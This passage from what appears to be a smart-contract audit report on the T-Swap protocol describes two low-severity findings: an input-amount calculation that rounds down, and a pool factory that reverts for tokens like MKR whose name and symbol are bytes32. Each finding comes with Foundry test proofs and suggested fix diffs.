        // Can the input gotten above get 10e18 output

        uint256 expected2 = pool.getOutputAmountBasedOnInput(
            expected, weth.balanceOf(address(pool)), poolToken.balanceOf(address(pool))
        );

        // this will pass if getInputAmountBasedOnOutput implement rounding with + 1
        assert(expected2 >= 10e18);

        vm.stopPrank();
    }
```

## Impact
1. Transaction Failures: Users may experience failed transactions if the provided input amount is insufficient to cover the desired output amount plus fees.
2. User Frustration: Repeated transaction failures due to insufficient input amounts can lead to user frustration and loss of trust in the platform.
3. Market Inefficiency: Underestimation of input amounts can result in inefficiencies in the liquidity pool, affecting the overall trading experience.

## Tools Used
Manual Review

## Recommendations
1. Add Rounding Up: Update the getInputAmountBasedOnOutput function to round up the calculated input amount by adding 1.
2. Review and Testing: Conduct thorough reviews and tests of all functions that involve input amount calculations to ensure they properly handle rounding.

```diff
function getInputAmountBasedOnOutput(
        uint256 outputAmount,
        uint256 inputReserves,
        uint256 outputReserves
    )
        public
        pure
        revertIfZero(outputAmount)
        revertIfZero(outputReserves)
        returns (uint256 inputAmount)
    {
-        return (inputReserves * outputAmount * 10000) / ((outputReserves - outputAmount) * 997);
+       return (inputReserves * outputAmount * 1000) / ((outputReserves - outputAmount) * 997) + 1;
    }
```
## <a id='L-06'></a>L-06. The `PoolFactory` contract wont work with tokens like MKR which have bytes32 `name` and `symbol`

_Submitted by [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-t-swap/blob/main/src/PoolFactory.sol

### [L-01] The `PoolFactory` contract wont work with tokens like MKR which have bytes32 `name` and `symbol`

**Description:**
Some ERC20 tokens like `MKR` (Maker governance token) have their `name` and `symbol` methods return bytes32 instead of strings.
**Impact:**
As stated in onboarding questions, the poolFactory should work with almost every ERC20, but using some tokens like Maker would result in a revert.
**Proof of Concept:**
Since the default OpenZeppelin `IERC20` doesn't support these tokens, it will revert. The test below, used with the `--fork-url` flag, tests the factory in a Mainnet forked environment.
```bash
forge test --mt testCreatePoolDoesntWorkWithBytes32 --fork-url $MAINNET_RPC_URL
```
```javascript
    function testCreatePoolDoesntWorkWithBytes32() public {
        address makerToken = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        address usdcToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        // dosent work with bytes32 tokens
        vm.expectRevert();
        address poolAddressMKR = factory.createPool(makerToken);
        // works fine with other tokens
        address poolAddressUSDC = factory.createPool(address(usdcToken));

        assertEq(poolAddressUSDC, factory.getPool(address(usdcToken)));
        assertEq(address(usdcToken), factory.getToken(poolAddressUSDC));
    }
```
**Recommended Mitigation:**
One easy way to fix this is to set the name and symbol as `createPool` function input parameters and don't get them from the ERC20 metadata.

```diff
-   function createPool(address tokenAddress) external returns (address) {
+   function createPool(address tokenAddress, string memory _name, string memory _symbol) external returns (address) {
        if (s_pools[tokenAddress] != address(0)) {
            revert PoolFactory__PoolAlreadyExists(tokenAddress);
        }
        string memory liquidityTokenName = string.concat(
            "T-Swap ",
-           IERC20(tokenAddress).name()
+           _name
        );
        string memory liquidityTokenSymbol = string.concat(
            "ts",
-           IERC20(tokenAddress).name()
+           _symbol
        );

        TSwapPool tPool = new TSwapPool(
            tokenAddress,
            i_wethToken,
            liquidityTokenName,
            liquidityTokenSymbol
        );
        s_pools[tokenAddress] = address(tPool);
        s_tokens[address(tPool)] = tokenAddress;
        emit PoolCreated(tokenAddress, address(tPool));
        return address(tPool);
    }
```





    